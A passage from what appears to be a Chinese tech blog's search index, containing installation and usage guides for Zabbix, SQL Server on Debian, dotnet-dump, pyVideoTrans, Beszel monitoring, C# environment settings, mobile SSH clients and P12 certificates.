https://repo.zabbix.com/zabbix/7.0/ubuntu/pool/main/z/zabbix-release/zabbix-release_7.0-1+ubuntu$(lsb_release -rs)_all.deb dpkg -i zabbix-release_7.0-1+ubuntu$(lsb_release -rs)_all.deb apt update 2: 安装 Zabbix Agent 在安装完成 Zabbix 软件源后，执行以下命令安装 Zabbix Agent：\n# CentOS/RHEL: yum install zabbix-agent -y # Ubuntu/Debian: apt install zabbix-agent -y 2. 配置 Zabbix Agent 编辑 Zabbix Agent 的配置文件：\nvi /etc/zabbix/zabbix_agentd.conf Server=11.11.11.11 # 设置 Zabbix Server 的 IP 地址 ServerActive=11.11.11.11 # 设置主动检查 Zabbix Server 的 IP 地址 Hostname=Your_Hostname # 设置主机名（确保与 Zabbix Server 上添加的主机名一致） 3. 启动并启用 Zabbix Agent 启动服务：\n# CentOS/RHEL: systemctl start zabbix-agent # Ubuntu/Debian: service zabbix-agent start # CentOS/RHEL: systemctl enable zabbix-agent # Ubuntu/Debian: systemctl enable zabbix-agent 4. 在 Zabbix Server 上添加主机 登录 Zabbix Server Web 界面 打开浏览器，访问 http://11.11.11.11/zabbix。 使用管理员账号登录（默认用户名/密码为 Admin/zabbix）。 添加主机 进入 Configuration → Hosts 页面，点击右上角的 “Create host” 按钮。 配置以下内容： Host name: 与 zabbix_agentd.conf 中的 Hostname 保持一致。 Visible name: 可选，设置主机的可见名称。 Groups: 将主机分配到一个组，例如 Linux servers。 Interfaces: 配置 Agent 的 IP 地址（即客户端 IP 地址）。 保存主机设置。 链接模板 在主机配置页面中，找到 Templates选项。 点击 “Add”，搜索并选择适合的模板（例如：Template OS Linux by Zabbix agent）。 保存设置。\n查看绿色 则添加客户端 成功\n基于鲲鹏搭建Zabbix分布式监控系统 企业为什么要上云? 加速企业IT设施发展 提升系统稳定性 提升开发部署敏捷性 降低IT成本 以云平台为基础 技术创新\n鲲鹏云服务 高效可控 安全可控 开放生态 ECS\n鲲鹏Zabbix参考 https://edu.huaweicloud.com/certifications/f4e893d0c7344c5385835f7af6f30888\n","permalink":"https://qfsyso.github.io/posts/zabbix/","summary":"Zabbix ·Zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案 ·Zabbix能监视各种网络参数，保证服务器系统的安全运营;并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 ·可以通过SNMP，Zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视、数据收集等功能，可以运行在多种平台上。\nZabbix服务器监控 Server端 apt update apache php\napt install apache2 php php-mysql php-mysqlnd php-ldap php-bcmath php-mbstring php-gd php-pdo php-xml libapache2-mod-php systemctl status apache2 # systemctl start apache2 # systemctl stop apache2 # systemctl restart apache2 db\napt install mariadb-server mariadb-client systemctl status mariadb mysql_secure_installation 回车 Y 密码 YYYY\nmysql -u root -p create database zabbix character set utf8 collate utf8_bin; grant all privileges on zabbix.* to zabbix@localhost identified by ‘123123.","title":"Zabbix"},{"content":"Debian 上运行 SQL Server 在 Debian 上安装 SQL Server 2017+ for Linux 微软官方支持 SQL Server 2017 / 2019 / 2022 在 Linux 上运行，但 Debian 没有官方支持，只支持 Ubuntu 和 Red Hat 系列。\n可以用 Debian 兼容的方式 安装 SQL Server 2017+，方法如下：\n1. 检查系统版本 确保的 Debian 版本是 Debian 10+（较新的版本兼容性更好）。\ncat /etc/os-release 如果是 Debian 9 或更早，建议升级到 Debian 10+，否则可能会遇到依赖问题。\n2. 添加 Microsoft SQL Server 仓库 （1）导入 Microsoft GPG 密钥 sudo apt update sudo apt install curl curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - （2）添加 SQL Server 软件源 sudo curl -fsSL https://packages.microsoft.com/config/debian/10/mssql-server-2019.list | sudo tee /etc/apt/sources.list.d/mssql-server.list ⚠ 注意：即使安装的是 SQL Server 2017，也推荐使用 2019 的仓库，因为 SQL Server 2017 也可以通过这个仓库安装。\n3. 安装 SQL Server sudo apt update sudo apt install -y mssql-server 安装完成后，SQL Server 还没有完全配置，需要运行初始化命令。\n4. 配置 SQL Server sudo /opt/mssql/bin/mssql-conf setup 这个命令会让选择：\n选择 SQL Server 版本（选择 Developer 或 Express 版） 设置 SA（超级管理员）密码（密码要求：8+字符，大小写+数字+特殊字符） 是否同意许可证协议（输入 YES） 安装完成后，SQL Server 2017+ 就会在 Debian 上运行。\n5. 启动 SQL Server 并检查状态 （1）启动 SQL Server sudo systemctl start mssql-server （2）查看 SQL Server 运行状态 sudo systemctl status mssql-server 如果看到 active (running)，说明 SQL Server 已经运行。\n（3）开机自动启动 SQL Server sudo systemctl enable mssql-server 6. 安装 SQL Server 命令行工具（可选） 要从终端管理数据库，需要安装 sqlcmd 和 bcp 工具。\n（1）添加 Microsoft 存储库 curl -fsSL https://packages.microsoft.com/config/debian/10/prod.list | sudo tee /etc/apt/sources.list.d/mssql-tools.list （2）安装 SQL Server 命令行工具 sudo apt update sudo apt install -y mssql-tools unixodbc-dev （3）配置 PATH 环境变量 echo \u0026#39;export PATH=\u0026#34;$PATH:/opt/mssql-tools/bin\u0026#34;\u0026#39; \u0026gt;\u0026gt; ~/.bashrc source ~/.bashrc 这样，就可以直接运行 sqlcmd 了。\n7. 连接 SQL Server 使用 sqlcmd 连接 SQL Server：\nsqlcmd -S localhost -U SA -P \u0026#39;的密码\u0026#39; 如果连接成功，会看到 1\u0026gt; 提示符，表示可以执行 SQL 语句了。例如：\nSELECT @@VERSION; GO 它会显示 SQL Server 版本信息。\n8. 开放防火墙端口（如果需要远程访问） SQL Server 默认使用 1433 端口，如果需要远程访问：\nsudo ufw allow 1433/tcp 然后在 其他电脑 通过 SQL Server Management Studio (SSMS) 或 sqlcmd 连接：\nsqlcmd -S 的服务器IP -U SA -P \u0026#39;的密码\u0026#39; 9. TEST（可选） 如果需要创建数据库：\nCREATE DATABASE MyDatabase; GO USE MyDatabase; GO 步骤\t命令 添加 Microsoft 仓库\t`curl -fsSL https://packages.microsoft.com/config/debian/10/mssql-server-2019.list 安装 SQL Server\tsudo apt update \u0026amp;\u0026amp; sudo apt install -y mssql-server 配置 SQL Server\tsudo /opt/mssql/bin/mssql-conf setup 启动 SQL Server\tsudo systemctl start mssql-server 安装 SQL 命令行工具\tsudo apt install -y mssql-tools unixodbc-dev 连接 SQL Server\tsqlcmd -S localhost -U SA -P \u0026lsquo;的密码\u0026rsquo; 这样，的 SQL Server 2017+ 就能在 Debian 上正常运行了！🚀\n直装总结 直装 SQL Server 2017+\nsudo apt update sudo apt install curl curl -fsSL https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - curl -fsSL https://packages.microsoft.com/config/debian/10/mssql-server-2019.list | sudo tee /etc/apt/sources.list.d/mssql-server.list sudo apt update sudo apt install -y mssql-server Docker 用 Docker 运行 SQL Server 2017 Express（仅适用于 .NET Core） 如果的 .NET 项目可以升级到 .NET Core，那么可以直接在 Debian 上运行 SQL Server 2017 Express for Linux。\ndocker run -e \u0026#39;ACCEPT_EULA=Y\u0026#39; -e \u0026#39;SA_PASSWORD=YourPassword!\u0026#39; \\ -p 1433:1433 --name sqlserver \\ -d mcr.microsoft.com/mssql/server:2017-latest ","permalink":"https://qfsyso.github.io/posts/debian-mssql/","summary":"Debian 上运行 SQL Server 在 Debian 上安装 SQL Server 2017+ for Linux 微软官方支持 SQL Server 2017 / 2019 / 2022 在 Linux 上运行，但 Debian 没有官方支持，只支持 Ubuntu 和 Red Hat 系列。\n可以用 Debian 兼容的方式 安装 SQL Server 2017+，方法如下：\n1. 检查系统版本 确保的 Debian 版本是 Debian 10+（较新的版本兼容性更好）。\ncat /etc/os-release 如果是 Debian 9 或更早，建议升级到 Debian 10+，否则可能会遇到依赖问题。\n2. 添加 Microsoft SQL Server 仓库 （1）导入 Microsoft GPG 密钥 sudo apt update sudo apt install curl curl -fsSL https://packages.","title":" debian mssql"},{"content":"dotnet-dump dotnet-dump 是一个用于 收集和分析 .NET 进程内存转储 的工具，适用于 排查内存占用过高、GC 问题、内存泄漏 等问题。\n1. 安装 dotnet-dump 如果的系统没有 dotnet-dump，可以安装：\ndotnet tool install --global dotnet-dump 如果已经安装，但命令找不到，可能需要 更新环境变量：\nexport PATH=\u0026#34;$HOME/.dotnet/tools:$PATH\u0026#34; 然后检查是否安装成功：\ndotnet-dump --help 2. 收集 dotnet 进程的内存转储 步骤 1：找到 dotnet 进程 ID ps aux | grep dotnet 例如：\nroot 134609 106 6.0 276010852 242112 pts/3 Sl 10:10 0:04 dotnet /root/nets4/IM.dll 这里的 134609 就是 dotnet 进程的 PID。\n步骤 2：收集转储 dotnet-dump collect -p 134609 它会生成一个 .dmp 文件，例如：\nWriting full dump to file /root/core_134609.dmp ... Dump successfully written 3. 分析 dotnet 转储 步骤 1：进入交互模式\ndotnet-dump analyze /root/core_134609.dmp 会进入 dotnet-dump 交互模式，类似这样：\ndotnet-dump analyze /root/core_134609.dmp Loading core dump\u0026hellip; (133920) loaded core dump from \u0026ldquo;/root/core_134609.dmp\u0026rdquo; Type \u0026lsquo;help\u0026rsquo; for more information.\n步骤 2：分析内存占用 ① 查看托管堆内存\ndumpheap -stat 会列出所有 .NET 对象 及其内存占用：\nvbnet MT Count TotalSize Class Name 00007ffb98b33800 10 2048 System.String 00007ffb98b3f8f8 5 1024 System.Byte[] \u0026hellip; 如果 TotalSize 非常大，可能是 大对象 (LOH) 或 GC 没有及时回收 导致的。\n② 查找占用最多内存的对象\ndumpheap -stat | sort -nr -k 3 | head -20 找出 占用内存最多的对象。\n③ 查看具体实例 假设 System.Byte[] 占用很多，可以查看实例：\ndumpheap -type System.Byte[] 会列出实例的地址，例如：\ncss\nAddress MT Size 00007FFBE80F01B0 00007FFBE827D6E8 102400 00007FFBE80F12C0 00007FFBE827D6E8 512000 然后可以查看某个实例的详细内容：\ndo 00007FFBE80F01B0 ④ 查看线程信息 如果的 .NET 进程占用 大量 CPU 或 GC 卡住，可以查看线程：\nthreads 然后可以选一个线程 ID，例如：\nclrstack -i 10 看看当前线程在执行什么。\n⑤ 查看 GC 信息\ngcroot 00007FFBE80F01B0 可以找出哪些对象引用了 00007FFBE80F01B0，帮助定位 内存泄漏。\n4. 结束分析 分析完后，可以输入：\nexit 退出 dotnet-dump 交互模式。\n5. 结合 dotnet-trace 进行实时分析 如果怀疑 .NET 进程在运行过程中占用大量内存，也可以使用：\ndotnet-trace collect -p 134609 --providers Microsoft-Windows-DotNETRuntime 然后用 perfview 或 dotnet-trace 进行分析。\n总结 安装 dotnet-dump：\ndotnet tool install --global dotnet-dump 收集 dotnet 进程的内存转储：\ndotnet-dump collect -p \u0026lt;PID\u0026gt; 分析转储：\ndotnet-dump analyze /path/to/dump 使用 dumpheap、gcroot、clrstack 等命令找出问题 如果是 GC 相关问题，可以尝试 Workstation GC (DOTNET_GCServer=0)\n关键 dotnet-dump collect -p \u0026lt;PID\u0026gt; 将 替换为实际进程的 ID\n","permalink":"https://qfsyso.github.io/posts/.net-dump/","summary":"dotnet-dump dotnet-dump 是一个用于 收集和分析 .NET 进程内存转储 的工具，适用于 排查内存占用过高、GC 问题、内存泄漏 等问题。\n1. 安装 dotnet-dump 如果的系统没有 dotnet-dump，可以安装：\ndotnet tool install --global dotnet-dump 如果已经安装，但命令找不到，可能需要 更新环境变量：\nexport PATH=\u0026#34;$HOME/.dotnet/tools:$PATH\u0026#34; 然后检查是否安装成功：\ndotnet-dump --help 2. 收集 dotnet 进程的内存转储 步骤 1：找到 dotnet 进程 ID ps aux | grep dotnet 例如：\nroot 134609 106 6.0 276010852 242112 pts/3 Sl 10:10 0:04 dotnet /root/nets4/IM.dll 这里的 134609 就是 dotnet 进程的 PID。\n步骤 2：收集转储 dotnet-dump collect -p 134609 它会生成一个 .dmp 文件，例如：\nWriting full dump to file /root/core_134609.","title":".NET dump"},{"content":"pyVideoTrans开源视频翻译 Translate the video from one language to another and add dubbing. 将视频从一种语言翻译为另一种语言，同时支持语音识别转录、语音合成、字幕翻译。\n百度网盘下载地址: https://pan.baidu.com/s/1AFcVVL9n5TfpgiQPfOMPiw?pwd=817i GitHub地址: https://github.com/jianchang512/pyvideotrans/releases/download/v3.64/win-PatchUpdate-3.65.7z\n1.选择需要转译的视频 2.选择翻译渠道 选择免费的翻译渠道即可\n也可以选择部署好的模型 如 ：本地qwen:7b模型 或 ds\n3.选择配音渠道 如 印度语短视频转译 则选择印度语\n这里选择 Elevenlabs.io的API 选择后要在顶部菜单输入API的key\nTTS设置 -\u0026gt; ElevenLabs.io 输入 key 注册有送免费的额度 https://elevenlabs.io/ 年付便宜2两个月\n选择音色，可以试听 选择嵌入字幕 软字幕（双语） 保留背景音\n4.选择 语音识别 语音识别模型 从 tiny 到 base -\u0026gt;small -\u0026gt; medium -\u0026gt; large-v3 模型，识别效果越来越好，但模型体积越来越大，识别速度越来越慢，需要更多CPU/内存/GPU资源。默认使用tiny模型，如果想要更好的效果，请使用更大模型 .en 后缀模型和 distil 开头的模型只用于识别英文发音视频\n根据需要选择\n5.点击 开始 处理视频 6.调整 音色 根据原视频男女声调整音色 ，男声选择男的音色 音色\n7.继续处理 等待处理完成 完成后即可得到 转换后的视频\n开源TTS GPT-SoVITS 是一款出色的多语言文本到语音（TTS）开源项目，支持中、英、日、韩等多种语言，主要功能包括： 零样本文本到语音（TTS）： 仅需5秒的声音样本，即可快速生成语音。 少样本 TTS： 只需1分钟的训练数据即可对模型进行微调，从而提升音色相似度和自然度。 跨语言支持： 支持与训练数据集不同语言的合成，目前支持英语、日语、韩语、粤语和中文。\nChatTTS-ui 项目地址 https://github.com/jianchang512/chattts-ui 启动 ChatTTS-ui项目后，将http地址，默认http://127.0.0.1:9966 填写到视频翻译配音软件\u0026ndash;菜单-设置-ChatTTS地址中\nCosyVoice 开源地址 https://github.com/FunAudioLLM/CosyVoice\nCosyVoice-api开源地址 https://github.com/jianchang512/cosyvoice-api\n支持 中文、英文、日语、韩语、粤语，对应语言代码分别是 zh|en|jp|ko|yue\nkokoro TTS 支持中文、英文、日语、法语、意大利语、葡萄牙、西班牙、印地语共8种语言配音 项目地址 https://github.com/jianchang512/kokoro-uiapi\nF5-TTS-api 该项目源码地址 https://github.com/jianchang512/f5-tts-api\n这是用于 F5-TTS 项目的api和webui F5-TTS 是一款先进的文本转语音系统，它使用深度学习技术生成逼真、高质量的人声。只需短短10秒的音频样本，就能克隆出你的声音。F5-TTS 能够准确再现语音，并赋予其丰富的感情色彩。\nElevenLabs官网。 https://elevenlabs.io/ 有免费额度\n","permalink":"https://qfsyso.github.io/posts/ai-tts-pyvideotrans/","summary":"pyVideoTrans开源视频翻译 Translate the video from one language to another and add dubbing. 将视频从一种语言翻译为另一种语言，同时支持语音识别转录、语音合成、字幕翻译。\n百度网盘下载地址: https://pan.baidu.com/s/1AFcVVL9n5TfpgiQPfOMPiw?pwd=817i GitHub地址: https://github.com/jianchang512/pyvideotrans/releases/download/v3.64/win-PatchUpdate-3.65.7z\n1.选择需要转译的视频 2.选择翻译渠道 选择免费的翻译渠道即可\n也可以选择部署好的模型 如 ：本地qwen:7b模型 或 ds\n3.选择配音渠道 如 印度语短视频转译 则选择印度语\n这里选择 Elevenlabs.io的API 选择后要在顶部菜单输入API的key\nTTS设置 -\u0026gt; ElevenLabs.io 输入 key 注册有送免费的额度 https://elevenlabs.io/ 年付便宜2两个月\n选择音色，可以试听 选择嵌入字幕 软字幕（双语） 保留背景音\n4.选择 语音识别 语音识别模型 从 tiny 到 base -\u0026gt;small -\u0026gt; medium -\u0026gt; large-v3 模型，识别效果越来越好，但模型体积越来越大，识别速度越来越慢，需要更多CPU/内存/GPU资源。默认使用tiny模型，如果想要更好的效果，请使用更大模型 .en 后缀模型和 distil 开头的模型只用于识别英文发音视频\n根据需要选择\n5.点击 开始 处理视频 6.调整 音色 根据原视频男女声调整音色 ，男声选择男的音色 音色","title":"AI TTS pyVideoTrans"},{"content":"在C#中，根据不同的环境（例如测试环境、发布环境）改变程序行为是一种常见的需求。通常，可以通过配置文件、环境变量或者预编译指令来实现这一需求。\n1. 使用预编译指令 预编译指令（如#if, #define）允许你在编译时根据不同的条件编译不同的代码块。这种方法通常用于编译时确定环境。\n首先，在项目属性中定义宏：\n打开项目属性（右键点击项目 -\u0026gt; 属性）。\n转到“构建”选项卡。\n在“条件编译符号”中输入宏名称，例如TEST或RELEASE。\n然后，在代码中使用这些宏：\n#define TEST class Program { static void Main(string[] args) { #if TEST Console.WriteLine(\u0026#34;This is the test environment.\u0026#34;); #else Console.WriteLine(\u0026#34;This is the release environment.\u0026#34;); #endif } } 2. 使用配置文件 另一种常见的方法是使用配置文件（如appsettings.json或app.config），并通过代码读取这些配置来决定程序的行为。这种方法更适合于运行时的环境切换。\n首先，在appsettings.json中添加环境配置：\n{ \u0026#34;Environment\u0026#34;: \u0026#34;Test\u0026#34; } 然后，在C#代码中读取这些配置：\nusing Microsoft.Extensions.Configuration; using System; using System.IO; class Program { static void Main(string[] args) { var builder = new ConfigurationBuilder() .SetBasePath(Directory.GetCurrentDirectory()) .AddJsonFile(\u0026#34;appsettings.json\u0026#34;, optional: true, reloadOnChange: true); IConfigurationRoot configuration = builder.Build(); var environment = configuration[\u0026#34;Environment\u0026#34;]; Console.WriteLine($\u0026#34;Environment: {environment}\u0026#34;); } } 3. 使用环境变量 环境变量也可以用来区分不同的运行环境。你可以在发布应用时设置不同的环境变量。\n在C#中读取环境变量：\nusing System; class Program { static void Main(string[] args) { string environment = Environment.GetEnvironmentVariable(\u0026#34;MY_APP_ENV\u0026#34;); // MY_APP_ENV是环境变量名，例如\u0026#34;Test\u0026#34;或\u0026#34;Release\u0026#34; Console.WriteLine($\u0026#34;Environment: {environment}\u0026#34;); } } 总结 预编译指令适合于编译时确定环境。\n配置文件适合于运行时确定环境，并且可以更灵活地管理不同环境的配置。\n环境变量提供了一种灵活的方式来切换应用运行的环境，无需重新编译代码。\n选择哪种方法取决于你的具体需求和偏好。通常，对于生产环境的配置，使用配置文件或环境变量是比较常见的做法，因为它们提供了更好的灵活性和易于管理性。而对于开发和测试阶段，预编译指令可能更为直接和简单。\n","permalink":"https://qfsyso.github.io/posts/.net-runtime-param/","summary":"在C#中，根据不同的环境（例如测试环境、发布环境）改变程序行为是一种常见的需求。通常，可以通过配置文件、环境变量或者预编译指令来实现这一需求。\n1. 使用预编译指令 预编译指令（如#if, #define）允许你在编译时根据不同的条件编译不同的代码块。这种方法通常用于编译时确定环境。\n首先，在项目属性中定义宏：\n打开项目属性（右键点击项目 -\u0026gt; 属性）。\n转到“构建”选项卡。\n在“条件编译符号”中输入宏名称，例如TEST或RELEASE。\n然后，在代码中使用这些宏：\n#define TEST class Program { static void Main(string[] args) { #if TEST Console.WriteLine(\u0026#34;This is the test environment.\u0026#34;); #else Console.WriteLine(\u0026#34;This is the release environment.\u0026#34;); #endif } } 2. 使用配置文件 另一种常见的方法是使用配置文件（如appsettings.json或app.config），并通过代码读取这些配置来决定程序的行为。这种方法更适合于运行时的环境切换。\n首先，在appsettings.json中添加环境配置：\n{ \u0026#34;Environment\u0026#34;: \u0026#34;Test\u0026#34; } 然后，在C#代码中读取这些配置：\nusing Microsoft.Extensions.Configuration; using System; using System.IO; class Program { static void Main(string[] args) { var builder = new ConfigurationBuilder() .SetBasePath(Directory.GetCurrentDirectory()) .AddJsonFile(\u0026#34;appsettings.json\u0026#34;, optional: true, reloadOnChange: true); IConfigurationRoot configuration = builder.","title":" .NET Runtime Param"},{"content":"ConnectBot ConnectBot是一款开源的SSH客户端，以其简洁实用而闻名。虽然界面相对简单，但功能却不失强大。ConnectBot支持多种加密方式，能够同时管理多个SSH会话，是一款稳定可靠的工具。\n简洁的用户界面，易于上手；\n强大的加密支持，保证连接安全；\n开源项目，社区支持良好。\nhttps://github.com/connectbot/connectbot\nTermux Termux不仅仅是一个SSH客户端，它更像是一个完整的Linux环境模拟器。用户可以在Termux中安装各种软件包，使其功能得到无限扩展。对于那些熟悉Linux系统的用户来说，Termux是一个极具吸引力的选择。\n丰富的软件包支持，可拓展性强；\n完整的Linux环境，适合高级用户；\n可以通过APT包管理器安装和更新软件。\nTermux还可以安装debian https://blog.csdn.net/2301_81229576/article/details/145148000\n","permalink":"https://qfsyso.github.io/posts/mobile-ssh/","summary":"ConnectBot ConnectBot是一款开源的SSH客户端，以其简洁实用而闻名。虽然界面相对简单，但功能却不失强大。ConnectBot支持多种加密方式，能够同时管理多个SSH会话，是一款稳定可靠的工具。\n简洁的用户界面，易于上手；\n强大的加密支持，保证连接安全；\n开源项目，社区支持良好。\nhttps://github.com/connectbot/connectbot\nTermux Termux不仅仅是一个SSH客户端，它更像是一个完整的Linux环境模拟器。用户可以在Termux中安装各种软件包，使其功能得到无限扩展。对于那些熟悉Linux系统的用户来说，Termux是一个极具吸引力的选择。\n丰富的软件包支持，可拓展性强；\n完整的Linux环境，适合高级用户；\n可以通过APT包管理器安装和更新软件。\nTermux还可以安装debian https://blog.csdn.net/2301_81229576/article/details/145148000","title":"Mobile SSH"},{"content":"Beszel 为何选择Beszel？Beszel 凭借轻量、易用、功能全面的特性，成为开源监控领域的一匹黑马。无论是个人用户还是技术团队，均可通过其快速搭建高效的监控体系。 项目地址:https://github.com/henrygd/beszel\nBeszel官网：https://beszel.dev/\n在两个服务器上部署 Beszel 的步骤。 第一步：准备工作 管理员的权限\n第二步：下载安装脚本（两个服务器都要做） 对于 Hub（管理中心）\ncurl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-hub.sh -o install-hub.sh \u0026amp;\u0026amp; chmod +x install-hub.sh 对于 Agent（监控小帮手）\ncurl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh \u0026amp;\u0026amp; chmod +x install-agent.sh 第三步：运行安装脚本（两个服务器分别做） 安装 Hub 在放 Hub 的服务器的命令行里，输入：\n./install-hub.sh 安装 Agent 在放 Agent 的服务器的命令行里，输入：\n./install-agent.sh 第四步：检查是否安装成功 检查 Hub 在安装 Hub 的服务器上，输入下面的命令来看看 Hub 是不是在正常工作：\nsystemctl status beszel-hub.service 检查 Agent\nsystemctl status beszel-agent.service 同个服务器 curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh \u0026amp;\u0026amp; chmod +x install-agent.sh ./install-agent.sh docker 部署 服务端（Hub）部署 Docker Compose ：\nservices: beszel: image: \u0026#39;henrygd/beszel\u0026#39; ports: - \u0026#39;8090:8090\u0026#39; volumes: - ./beszel_data:/beszel_data 运行后访问 http://IP:8090 初始化管理员账户。\n客户端（Agent）部署 services: beszel-agent: image: \u0026#39;henrygd/beszel-agent\u0026#39; network_mode: host volumes: - /var/run/docker.sock:/var/run/docker.sock:ro environment: PORT: 45876 KEY: \u0026#39;从Hub获取的公钥\u0026#39; 部署完成后，在 Hub 界面添加客户端 IP 及密钥即可完成绑定。3. 常见问题权限问题：部分 NAS 系统（如群晖 DSM）需确保 Agent 容器拥有 root 权限。防火墙配置：若 Hub 与 Agent 跨主机部署，需开放端口 45876。\n","permalink":"https://qfsyso.github.io/posts/beszel-lightweight-monitor/","summary":"Beszel 为何选择Beszel？Beszel 凭借轻量、易用、功能全面的特性，成为开源监控领域的一匹黑马。无论是个人用户还是技术团队，均可通过其快速搭建高效的监控体系。 项目地址:https://github.com/henrygd/beszel\nBeszel官网：https://beszel.dev/\n在两个服务器上部署 Beszel 的步骤。 第一步：准备工作 管理员的权限\n第二步：下载安装脚本（两个服务器都要做） 对于 Hub（管理中心）\ncurl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-hub.sh -o install-hub.sh \u0026amp;\u0026amp; chmod +x install-hub.sh 对于 Agent（监控小帮手）\ncurl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh \u0026amp;\u0026amp; chmod +x install-agent.sh 第三步：运行安装脚本（两个服务器分别做） 安装 Hub 在放 Hub 的服务器的命令行里，输入：\n./install-hub.sh 安装 Agent 在放 Agent 的服务器的命令行里，输入：\n./install-agent.sh 第四步：检查是否安装成功 检查 Hub 在安装 Hub 的服务器上，输入下面的命令来看看 Hub 是不是在正常工作：\nsystemctl status beszel-hub.service 检查 Agent\nsystemctl status beszel-agent.service 同个服务器 curl -sL https://raw.githubusercontent.com/henrygd/beszel/main/supplemental/scripts/install-agent.sh -o install-agent.sh \u0026amp;\u0026amp; chmod +x install-agent.","title":"Beszel Lightweight Monitor"},{"content":"P12 证书 P12 证书，也称为 PFX 证书（在 Windows 系统中常用 PFX 扩展名，而在其他一些系统中常用 P12 扩展名），其全称为 Personal Information Exchange。它是一种用于存储个人身份信息和加密密钥的文件格式，通常采用 PKCS #12 标准。P12 证书文件包含了公钥、私钥以及证书链，能够保证数据在传输和存储过程中的安全性和完整性，广泛应用于 SSL/TLS 加密、代码签名、数字身份验证等场景。\nP12 证书的特点 综合性：同时包含了公钥、私钥和证书链，方便在不同系统和应用中进行部署和使用。 加密性：使用密码对私钥进行加密保护，只有知道密码的用户才能访问私钥，提高了私钥的安全性。 跨平台性：可以在多种操作系统和应用程序中使用，如 Windows、Linux、macOS 等。\n在 C# 中处理 P12 证书 3.1 生成 P12 证书 以下是一个在 C# 中生成 P12 证书的示例代码：\nusing System; using System.IO; using System.Security.Cryptography; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { // 生成RSA密钥对 using (RSA rsa = RSA.Create(2048)) { // 创建证书请求 var certificateRequest = new CertificateRequest( \u0026#34;CN=MySelfSignedCertificate\u0026#34;, rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1); // 设置证书扩展 certificateRequest.CertificateExtensions.Add( new X509BasicConstraintsExtension(true, false, 0, true)); certificateRequest.CertificateExtensions.Add( new X509KeyUsageExtension( X509KeyUsageFlags.DigitalSignature | X509KeyUsageFlags.KeyEncipherment, false)); // 生成自签名证书 var certificate = certificateRequest.CreateSelfSigned( DateTimeOffset.UtcNow.AddDays(-1), DateTimeOffset.UtcNow.AddDays(365)); // 保存为P12文件 string p12FilePath = \u0026#34;MyCertificate.p12\u0026#34;; string p12Password = \u0026#34;MyPassword123\u0026#34;; byte[] p12Bytes = certificate.Export(X509ContentType.Pfx, p12Password); File.WriteAllBytes(p12FilePath, p12Bytes); Console.WriteLine($\u0026#34;P12文件已生成: {p12FilePath}\u0026#34;); } } } 3.2 读取 P12 证书 以下是一个在 C# 中读取 P12 证书的示例代码：\nusing System; using System.Security.Cryptography.X509Certificates; class Program { static void Main() { try { // P12证书文件的路径 string p12FilePath = \u0026#34;MyCertificate.p12\u0026#34;; // P12证书文件的密码 string p12Password = \u0026#34;MyPassword123\u0026#34;; // 读取P12证书文件 using (X509Certificate2 certificate = new X509Certificate2(p12FilePath, p12Password)) { // 输出证书的基本信息 Console.WriteLine(\u0026#34;证书信息：\u0026#34;); Console.WriteLine($\u0026#34;主题: {certificate.Subject}\u0026#34;); Console.WriteLine($\u0026#34;颁发者: {certificate.Issuer}\u0026#34;); Console.WriteLine($\u0026#34;有效期开始时间: {certificate.NotBefore}\u0026#34;); Console.WriteLine($\u0026#34;有效期结束时间: {certificate.NotAfter}\u0026#34;); Console.WriteLine($\u0026#34;指纹: {certificate.Thumbprint}\u0026#34;); // 检查证书是否包含私钥 if (certificate.HasPrivateKey) { Console.WriteLine(\u0026#34;证书包含私钥。\u0026#34;); } else { Console.WriteLine(\u0026#34;证书不包含私钥。\u0026#34;); } } } catch (Exception ex) { Console.WriteLine($\u0026#34;读取证书时出错: {ex.Message}\u0026#34;); } } } P12 证书的使用场景 SSL/TLS 加密：在 Web 服务器和客户端之间建立安全的通信通道，确保数据在传输过程中的保密性和完整性。 代码签名：用于对软件代码进行数字签名，保证代码的来源和完整性，防止代码被篡改。 数字身份验证：在企业内部或其他安全系统中，用于验证用户的身份，确保只有合法用户才能访问系统资源。\n常见证书类型 P12（PFX）证书 私钥保护：P12 证书将公钥、私钥和证书链整合在一个文件中，并使用用户设置的密码对私钥进行加密。这种方式提供了较高的私钥保护，如果密码足够复杂，能有效防止私钥被非法获取。例如，在一个企业内部系统中，使用 P12 证书进行客户端身份验证，只有知道正确密码的用户才能使用私钥进行签名操作。 完整性：由于所有相关信息都在一个文件中，便于管理和传输，减少了信息丢失或被篡改的风险。但一旦文件丢失且密码泄露，攻击者就可以获取私钥，对系统安全造成威胁。 在数字证书领域，除了前面提到的 P12（PFX）证书，还有多种不同类型的证书，它们各自有不同的特点和应用场景\nX.509 证书 简介：X.509 是一个定义了公钥证书格式的标准，几乎所有的数字证书都遵循 X.509 标准。它是互联网上使用最广泛的证书格式，包含了公钥、持有者信息、颁发者信息、有效期等内容。 应用场景：广泛应用于 SSL/TLS 加密、电子邮件加密、代码签名、身份验证等领域。例如，当访问一个使用 HTTPS 协议的网站时，浏览器会验证该网站的 X.509 证书，以确保与真实的网站进行通信。 常见文件格式：包括 .cer、.crt、.der、.pem 等。\nPEM 证书 简介：PEM（Privacy - Enhanced Mail）是一种常见的证书文件格式，它使用 Base64 编码将二进制的证书数据转换为 ASCII 文本，通常以 .pem 为文件扩展名。PEM 文件可以包含证书、私钥或证书链，并且可以通过特定的标签（如 +++\u0026ndash;BEGIN CERTIFICATE+++\u0026ndash; 和 +++\u0026ndash;END CERTIFICATE+++\u0026ndash;）来区分不同的内容。 应用场景：常用于 Linux 和 Unix 系统，以及一些开源软件和服务器应用中。例如，在 Apache 或 Nginx 等 Web 服务器配置中，经常使用 PEM 格式的证书来启用 HTTPS 服务。 特点：文本格式，易于查看和编辑，可跨平台使用。\nDER 证书 简介：DER（Distinguished Encoding Rules）是一种二进制编码格式，它将证书数据以二进制形式存储，通常以 .der 